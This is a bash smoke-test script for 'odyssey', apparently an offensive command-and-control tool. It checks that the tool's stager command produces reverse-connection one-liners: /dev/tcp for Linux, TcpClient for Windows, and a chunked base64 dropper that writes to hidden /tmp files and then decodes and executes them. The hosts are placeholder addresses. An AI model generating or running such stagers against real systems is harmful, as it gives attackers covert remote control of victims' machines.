#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
ODYSSEY="${ODYSSEY:-$ROOT_DIR/bin/odyssey}"

echo "[S2] test 1/3: oneliner linux"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format oneliner --run-args "--version")

if ! echo "$OUT" | grep -q "exec 3<>/dev/tcp/203.0.113.10/4444"; then
    echo "FAIL: missing /dev/tcp connect" >&2
    exit 1
fi
if ! echo "$OUT" | grep -q "\-\-version"; then
    echo "FAIL: missing --version in args" >&2
    exit 1
fi
echo "[S2] ok 1/3"

echo "[S2] test 2/3: oneliner windows"

OUT=$("$ODYSSEY" stager --connect 198.51.100.5:8443 --os windows --format oneliner --run-args "reverse-client --connect 198.51.100.5:9001")

if ! echo "$OUT" | grep -q "Net.Sockets.TcpClient"; then
    echo "FAIL: missing TcpClient" >&2
    exit 1
fi
if ! echo "$OUT" | grep -q "198.51.100.5"; then
    echo "FAIL: missing IP" >&2
    exit 1
fi
if ! echo "$OUT" | grep -q "8443"; then
    echo "FAIL: missing port" >&2
    exit 1
fi
echo "[S2] ok 2/3"

echo "[S2] test 3/3: base64 mini-stager linux"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:5555 --os linux --format base64 --token "smoke-test-token-2026" 2>/dev/null)

FIRST_LINE=$(echo "$OUT" | head -1 || true)
LAST_LINE=$(echo "$OUT" | tail -1 || true)
LINE_COUNT=$(echo "$OUT" | wc -l || true)

if [ "$LINE_COUNT" -lt 5 ] || [ "$LINE_COUNT" -gt 20 ]; then
    echo "FAIL: expected 5-20 chunked lines, got $LINE_COUNT" >&2
    exit 1
fi
if ! echo "$FIRST_LINE" | grep -q "^echo -n "; then
    echo "FAIL: first line should start with echo -n" >&2
    exit 1
fi
if ! echo "$FIRST_LINE" | grep -q ">>/tmp/\.b$"; then
    echo "FAIL: first line should append to /tmp/.b" >&2
    exit 1
fi
if ! echo "$LAST_LINE" | grep -q "base64 -d /tmp/\.b>/tmp/\.s"; then
    echo "FAIL: last line should decode and execute" >&2
    exit 1
fi
MAX_LEN=0
while IFS= read -r line; do
    len=${#line}
    if [ "$len" -gt "$MAX_LEN" ]; then MAX_LEN=$len; fi
done <<< "$OUT"
if [ "$MAX_LEN" -gt 1650 ]; then
    echo "FAIL: longest line is $MAX_LEN chars, exceeds chunk limit" >&2
    exit 1
fi
echo "[S2] ok 3/3"

echo "S2_SMOKE_OK"
